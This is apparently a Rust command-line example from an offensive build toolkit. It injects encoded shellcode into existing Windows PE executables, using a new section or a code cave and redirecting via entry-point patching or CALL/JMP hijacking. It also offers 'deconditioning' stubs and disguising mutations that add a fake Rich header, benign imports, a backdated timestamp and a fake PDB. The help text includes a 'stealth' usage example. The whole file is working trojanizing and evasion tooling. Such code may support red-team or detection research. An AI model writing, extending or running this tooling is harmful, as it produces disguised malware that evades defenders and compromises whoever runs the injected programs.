//! Inject encoded shellcode into an existing PE binary.
//!
//! Uses `PeInjector` to add a new section with a carrier stub + encoded payload,
//! then optionally applies binary mutations via `BinaryMutator`.
//!
//! Usage:
//!   cargo run -p build --example pe_inject -- --payload shellcode.bin --target hello_world.exe
//!   cargo run -p build --example pe_inject -- -p sc.bin -t target.exe --encoding xor --return-to-oep
//!   cargo run -p build --example pe_inject -- -p sc.bin -t target.exe -m binary.rich_header -m binary.timestamp
//!   cargo run -p build --example pe_inject -- -p sc.bin --target-dir data/injectables --list-targets

use build::EncodingType;
use build::mutator::MutationSpec;
use build::pe_inject::decon::DeconPreset;
use build::pe_inject::{
    InjectedArtifact, InjectionMode, PeInjectConfig, PeInjectInput, PeInjector, RedirectMode,
    scan_injectables_dir,
};
use std::path::PathBuf;
use std::str::FromStr;
use std::{env, fs, process};

fn main() {
    let args = Args::parse();

    if args.help {
        print_help();
        return;
    }

    // --list-targets mode: scan and print suitability report, then exit
    if args.list_targets {
        let default_dir = PathBuf::from("data/injectables");
        let dir = args.target_dir.as_ref().unwrap_or(&default_dir);
        let targets = scan_injectables_dir(dir).unwrap_or_else(|e| {
            eprintln!("Error scanning '{}': {}", dir.display(), e);
            process::exit(1);
        });
        if targets.is_empty() {
            eprintln!("No .exe files found in {}", dir.display());
            process::exit(0);
        }
        eprintln!(
            "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  Status",
            "Target", "Size", "Cave", "Hijack", "Writable"
        );
        eprintln!("{}", "-".repeat(80));
        for t in &targets {
            let name = t
                .path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let size_str = format_size(t.file_size);
            if t.valid {
                eprintln!(
                    "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  {}",
                    name,
                    size_str,
                    format_size(t.largest_cave_bytes as u64),
                    if t.has_hijack_site { "yes" } else { "no" },
                    if t.has_writable_section_cave {
                        "yes"
                    } else {
                        "no"
                    },
                    format_args!("{} sections", t.num_sections),
                );
            } else {
                eprintln!(
                    "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  INVALID: {}",
                    name,
                    size_str,
                    "-",
                    "-",
                    "-",
                    t.error.as_deref().unwrap_or("unknown"),
                );
            }
        }
        return;
    }

    let payload_path = match &args.payload {
        Some(p) => p.clone(),
        None => {
            eprintln!("Error: --payload / -p is required");
            eprintln!(
                "Usage: cargo run -p build --example pe_inject -- -p <PAYLOAD.bin> -t <TARGET.exe>"
            );
            process::exit(1);
        }
    };

    // Resolve target source: --target takes precedence over --target-dir
    let (target_pe_path, injectables_dir) = if let Some(t) = &args.target {
        (Some(t.clone()), None)
    } else if let Some(d) = &args.target_dir {
        (None, Some(d.clone()))
    } else {
        eprintln!("Error: either --target / -t or --target-dir is required");
        process::exit(1);
    };

    let payload = fs::read(&payload_path).unwrap_or_else(|e| {
        eprintln!("Error reading payload '{}': {}", payload_path.display(), e);
        process::exit(1);
    });

    eprintln!(
        "[pe_inject] Payload: {} ({} bytes)",
        payload_path.display(),
        payload.len()
    );
    if let Some(ref t) = target_pe_path {
        eprintln!("[pe_inject] Target PE: {}", t.display());
    }
    if let Some(ref d) = injectables_dir {
        eprintln!("[pe_inject] Target dir: {} (auto-select)", d.display());
    }

    let encoding = EncodingType::from_str(&args.encoding).unwrap_or_else(|e| {
        eprintln!("Error: {}", e);
        process::exit(1);
    });

    let mutations: Vec<MutationSpec> = args
        .mutations
        .iter()
        .map(|s| MutationSpec::from_cli_str(s))
        .collect();

    let config = PeInjectConfig {
        target_pe_path,
        injectables_dir,
        output_dir: args.output_dir.clone(),
    };

    let injector = PeInjector::new(config).unwrap_or_else(|e| {
        eprintln!("Error initializing injector: {}", e);
        process::exit(1);
    });

    let injection_mode = match args.injection_mode.as_str() {
        "section" | "new-section" => InjectionMode::NewSection,
        "cave" | "code-cave" => InjectionMode::CodeCave,
        "split" | "split-cave" => InjectionMode::SplitCave,
        other => {
            eprintln!(
                "Error: unknown injection mode '{}' (expected: section, cave, split)",
                other
            );
            process::exit(1);
        }
    };

    let redirect_mode = match args.redirect_mode.as_str() {
        "header" | "header-patch" => RedirectMode::HeaderPatch,
        "hijack" | "ep-hijack" => RedirectMode::EpHijack,
        other => {
            eprintln!(
                "Error: unknown redirect mode '{}' (expected: header, hijack)",
                other
            );
            process::exit(1);
        }
    };

    let sc_checkpoint_count = if args.checkpoints > 0 {
        Some(args.checkpoints)
    } else {
        None
    };

    let xwin_dir = args.xwin_dir.clone();

    // Build decon spec from CLI flags
    let decon_spec = if let Some(ref preset_name) = args.decon {
        let preset = DeconPreset::parse(preset_name).unwrap_or_else(|| {
            eprintln!(
                "Error: unknown decon preset '{}' (expected: alloc_loop, alloc_exec, mixed_apis, entropy_flood, thread_alloc)",
                preset_name
            );
            process::exit(1);
        });
        Some(preset.to_spec(args.decon_rounds))
    } else {
        None
    };

    let input = PeInjectInput {
        payload,
        encoding,
        binary_mutations: mutations,
        return_to_oep: args.return_to_oep,
        injection_mode,
        redirect_mode,
        sc_checkpoint_count,
        xwin_dir,
        decon_spec,
    };

    eprintln!(
        "[pe_inject] Encoding: {}, Return-to-OEP: {}, Injection: {:?}, Redirect: {:?}",
        args.encoding, args.return_to_oep, injection_mode, redirect_mode,
    );
    if !args.mutations.is_empty() {
        eprintln!("[pe_inject] Binary mutations: {:?}", args.mutations);
    }
    if args.decon.is_some() {
        eprintln!(
            "[pe_inject] Decon: {:?} ({} rounds)",
            args.decon.as_deref().unwrap_or("none"),
            args.decon_rounds,
        );
    }

    let artifact: InjectedArtifact = injector.inject(&input).unwrap_or_else(|e| {
        eprintln!("[pe_inject] Injection FAILED: {:#}", e);
        process::exit(1);
    });

    eprintln!("[pe_inject] --- Injection succeeded ---");
    eprintln!("[pe_inject] artifact_id:       {}", artifact.artifact_id);
    eprintln!("[pe_inject] target_pe:         {}", artifact.target_pe_name);
    eprintln!(
        "[pe_inject] size:              {} bytes",
        artifact.size_bytes
    );
    eprintln!(
        "[pe_inject] output:            {}",
        artifact.output_path.display()
    );
    eprintln!(
        "[pe_inject] original EP:       {:#x}",
        artifact.original_entry_point
    );
    eprintln!(
        "[pe_inject] injected section:  {:#x}",
        artifact.injected_section_rva
    );
    eprintln!(
        "[pe_inject] injection mode:    {:?}",
        artifact.injection_mode_used
    );
    eprintln!(
        "[pe_inject] redirect mode:     {:?}",
        artifact.redirect_mode_used
    );
    if let Some(ref sec) = artifact.cave_section {
        eprintln!("[pe_inject] cave section:      {}", sec);
    }
    eprintln!(
        "[pe_inject] mutations:         {:?}",
        artifact.mutations_applied
    );
    if artifact.checkpoint_count > 0 {
        eprintln!(
            "[pe_inject] checkpoints:       {}",
            artifact.checkpoint_count
        );
    }
    if artifact.decon_rounds > 0 {
        eprintln!("[pe_inject] decon rounds:      {}", artifact.decon_rounds);
    }

    // Copy to user-specified output path
    if let Some(dest) = &args.output {
        fs::copy(&artifact.output_path, dest).unwrap_or_else(|e| {
            eprintln!("Error copying artifact to '{}': {}", dest.display(), e);
            process::exit(1);
        });
        eprintln!("[pe_inject] Copied -> {}", dest.display());
    }

    // Dump section for diagnostics
    if args.dump_section {
        dump_injected_section(&artifact);
    }
}

/// Dump the injected section bytes for diagnostic inspection.
fn dump_injected_section(artifact: &InjectedArtifact) {
    let pe_bytes = match fs::read(&artifact.output_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[dump] Failed to read output PE: {}", e);
            return;
        }
    };
    let pe = match goblin::pe::PE::parse(&pe_bytes) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[dump] Failed to parse output PE: {}", e);
            return;
        }
    };
    eprintln!("\n[dump] === Injected Section Diagnostic ===");
    eprintln!("[dump] ImageBase: {:#x}", pe.image_base);
    eprintln!("[dump] Entry point RVA: {:#x}", pe.entry);
    eprintln!(
        "[dump] Injected section RVA: {:#x}",
        artifact.injected_section_rva
    );

    // Find the injected section
    for section in &pe.sections {
        if section.virtual_address == artifact.injected_section_rva {
            let name = String::from_utf8_lossy(&section.name).replace('\0', "");
            let chars = section.characteristics;
            eprintln!("[dump] Section: '{}'", name);
            eprintln!("[dump]   VirtualAddress:    {:#x}", section.virtual_address);
            eprintln!(
                "[dump]   VirtualSize:       {:#x} ({} bytes)",
                section.virtual_size, section.virtual_size
            );
            eprintln!(
                "[dump]   SizeOfRawData:     {:#x} ({} bytes)",
                section.size_of_raw_data, section.size_of_raw_data
            );
            eprintln!(
                "[dump]   PointerToRawData:  {:#x}",
                section.pointer_to_raw_data
            );
            eprintln!("[dump]   Characteristics:   {:#010x}", chars);
            eprintln!("[dump]     MEM_READ:     {}", (chars & 0x4000_0000) != 0);
            eprintln!("[dump]     MEM_WRITE:    {}", (chars & 0x8000_0000) != 0);
            eprintln!("[dump]     MEM_EXECUTE:  {}", (chars & 0x2000_0000) != 0);
            eprintln!("[dump]     CNT_CODE:     {}", (chars & 0x0000_0020) != 0);

            // Dump first 128 bytes of section data
            let raw_off = section.pointer_to_raw_data as usize;
            let dump_len = std::cmp::min(128, section.size_of_raw_data as usize);
            if raw_off + dump_len <= pe_bytes.len() {
                eprintln!("[dump]   First {} bytes of section data:", dump_len);
                for row in 0..dump_len.div_ceil(16) {
                    let start = row * 16;
                    let end = std::cmp::min(start + 16, dump_len);
                    let hex: Vec<String> = pe_bytes[raw_off + start..raw_off + end]
                        .iter()
                        .map(|b| format!("{:02x}", b))
                        .collect();
                    let ascii: String = pe_bytes[raw_off + start..raw_off + end]
                        .iter()
                        .map(|&b| {
                            if (0x20..0x7f).contains(&b) {
                                b as char
                            } else {
                                '.'
                            }
                        })
                        .collect();
                    eprintln!("[dump]     {:04x}: {:<48} {}", start, hex.join(" "), ascii);
                }
            }

            // Check DllCharacteristics for process mitigations
            let e_lfanew =
                u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into().unwrap_or([0; 4])) as usize;
            let opt_off = e_lfanew + 4 + 20;
            if opt_off + 0x48 <= pe_bytes.len() {
                let dll_chars = u16::from_le_bytes(
                    pe_bytes[opt_off + 0x46..opt_off + 0x48]
                        .try_into()
                        .unwrap_or([0; 2]),
                );
                eprintln!("[dump] DllCharacteristics: {:#06x}", dll_chars);
                eprintln!(
                    "[dump]   DYNAMIC_BASE (ASLR):   {}",
                    (dll_chars & 0x0040) != 0
                );
                eprintln!(
                    "[dump]   NX_COMPAT (DEP):       {}",
                    (dll_chars & 0x0100) != 0
                );
                eprintln!(
                    "[dump]   NO_SEH:                {}",
                    (dll_chars & 0x0400) != 0
                );
                eprintln!(
                    "[dump]   GUARD_CF (CFG):        {}",
                    (dll_chars & 0x4000) != 0
                );
                eprintln!(
                    "[dump]   FORCE_INTEGRITY:       {}",
                    (dll_chars & 0x0080) != 0
                );
            }

            break;
        }
    }
    eprintln!("[dump] === End Diagnostic ===\n");
}

fn format_size(bytes: u64) -> String {
    if bytes >= 1_048_576 {
        format!("{:.1} MB", bytes as f64 / 1_048_576.0)
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{} B", bytes)
    }
}

// -- Args --

struct Args {
    help: bool,
    payload: Option<PathBuf>,
    target: Option<PathBuf>,
    target_dir: Option<PathBuf>,
    list_targets: bool,
    output: Option<PathBuf>,
    encoding: String,
    return_to_oep: bool,
    mutations: Vec<String>,
    output_dir: PathBuf,
    injection_mode: String,
    redirect_mode: String,
    checkpoints: u32,
    xwin_dir: Option<PathBuf>,
    decon: Option<String>,
    decon_rounds: u16,
    dump_section: bool,
}

impl Args {
    fn parse() -> Self {
        let mut a = Args {
            help: false,
            payload: None,
            target: None,
            target_dir: None,
            list_targets: false,
            output: None,
            encoding: "xor".into(),
            return_to_oep: false,
            mutations: vec![],
            output_dir: PathBuf::from("./artifacts"),
            injection_mode: "section".into(),
            redirect_mode: "header".into(),
            checkpoints: 0,
            xwin_dir: Some(PathBuf::from("/root/.xwin")),
            decon: None,
            decon_rounds: 20,
            dump_section: false,
        };
        let argv: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < argv.len() {
            match argv[i].as_str() {
                "--help" | "-h" => a.help = true,
                "--payload" | "-p" => {
                    i += 1;
                    a.payload = Some(PathBuf::from(&argv[i]));
                }
                "--target" | "-t" => {
                    i += 1;
                    a.target = Some(PathBuf::from(&argv[i]));
                }
                "--target-dir" => {
                    i += 1;
                    a.target_dir = Some(PathBuf::from(&argv[i]));
                }
                "--list-targets" => a.list_targets = true,
                "--output" | "-o" => {
                    i += 1;
                    a.output = Some(PathBuf::from(&argv[i]));
                }
                "--encoding" => {
                    i += 1;
                    a.encoding = argv[i].clone();
                }
                "--return-to-oep" => a.return_to_oep = true,
                "--mutation" | "-m" => {
                    i += 1;
                    a.mutations.push(argv[i].clone());
                }
                "--output-dir" => {
                    i += 1;
                    a.output_dir = PathBuf::from(&argv[i]);
                }
                "--injection-mode" => {
                    i += 1;
                    a.injection_mode = argv[i].clone();
                }
                "--redirect-mode" => {
                    i += 1;
                    a.redirect_mode = argv[i].clone();
                }
                "--checkpoints" => {
                    i += 1;
                    a.checkpoints = argv[i].parse().unwrap_or_else(|_| {
                        eprintln!("Error: --checkpoints must be a number");
                        process::exit(1);
                    });
                }
                "--xwin-dir" => {
                    i += 1;
                    a.xwin_dir = Some(PathBuf::from(&argv[i]));
                }
                "--decon" => {
                    i += 1;
                    a.decon = Some(argv[i].clone());
                }
                "--decon-rounds" => {
                    i += 1;
                    a.decon_rounds = argv[i].parse().unwrap_or_else(|_| {
                        eprintln!("Error: --decon-rounds must be a number");
                        process::exit(1);
                    });
                }
                "--dump-section" => a.dump_section = true,
                other => {
                    eprintln!("Unknown argument: {}", other);
                    process::exit(1);
                }
            }
            i += 1;
        }
        a
    }
}

fn print_help() {
    eprintln!(
        r#"pe_inject — Inject shellcode into an existing PE binary

Adds a carrier stub + encoded payload, redirects execution, and optionally
applies binary mutations.

USAGE:
    cargo run -p build --example pe_inject -- -p <PAYLOAD> -t <TARGET> [OPTIONS]
    cargo run -p build --example pe_inject -- -p <PAYLOAD> --target-dir <DIR> [OPTIONS]
    cargo run -p build --example pe_inject -- --target-dir <DIR> --list-targets

REQUIRED (for injection):
    -p, --payload <FILE>            Raw .bin shellcode payload

TARGET (one of):
    -t, --target <FILE>             Host PE binary to inject into (x64 PE32+)
    --target-dir <DIR>              Directory of injectable PEs (auto-selects best
                                    target for payload size + mode).
                                    --target takes precedence if both specified.

OPTIONS:
    -h, --help                      Show this help
    --list-targets                  Scan --target-dir and print suitability report, then exit.
    -o, --output <FILE>             Copy final .exe to this path
    --encoding <TYPE>               xor | subbyte | none  (default: xor)
                                    NOTE: "english" is NOT supported for PE injection
    --return-to-oep                 Jump back to original entry point after shellcode
    -m, --mutation <ID[:params]>    Binary mutation to apply post-injection (repeatable)
    --output-dir <DIR>              Build output dir (default: ./artifacts)
    --injection-mode <MODE>         section | cave | split  (default: section)
                                    section: new ".extra" section (v1)
                                    cave:    code cave in existing section padding
                                    split:   (reserved, not yet implemented)
    --redirect-mode <MODE>          header | hijack  (default: header)
                                    header:  overwrite AddressOfEntryPoint
                                    hijack:  patch CALL/JMP in EP function body
    --decon <PRESET>                Deconditioning preset to prepend before payload.
                                    Presets: alloc_loop, alloc_exec, mixed_apis,
                                    entropy_flood, thread_alloc
                                    Requires --xwin-dir.
    --decon-rounds <N>              Number of decon rounds (default: 20)
    --dump-section                  Dump injected section bytes and PE characteristics
                                    for diagnostic inspection.

BINARY MUTATIONS (applied after injection):
    binary.rich_header              Inject MSVC Rich header (param: donor=notepad|calc|explorer)
    binary.import_pad               Add benign imports (param: count=50)
    binary.resource_inject          Add version info + manifest
    binary.section_rename           Rename sections to MSVC defaults
    binary.timestamp                Backdate PE timestamp (params: age_days=365)
    binary.string_inject            Benign strings (consolidated)
    binary.entropy_normalize        Low-entropy padding (consolidated)
    binary.size_pad                 Pad PE to target size (consolidated)
    binary.debug_dir                Add fake PDB debug directory

EXAMPLES:
    # Basic XOR injection (v1 behavior)
    cargo run -p build --example pe_inject -- -p shellcode.bin -t hello_world.exe -o injected.exe

    # Auto-select best target from directory
    cargo run -p build --example pe_inject -- -p sc.bin --target-dir data/injectables -o injected.exe

    # List available targets with suitability info
    cargo run -p build --example pe_inject -- --target-dir data/injectables --list-targets

    # Stealth: code cave + EP hijack (no new section, no header EP change)
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe \
      --injection-mode cave --redirect-mode hijack --encoding none -o stealth.exe

    # No encoding, return to original entry point
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe --encoding none --return-to-oep

    # With binary mutations
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe \
      -m binary.rich_header:donor=notepad \
      -m binary.timestamp:age_days=180 \
      -o mutated.exe"#
    );
}
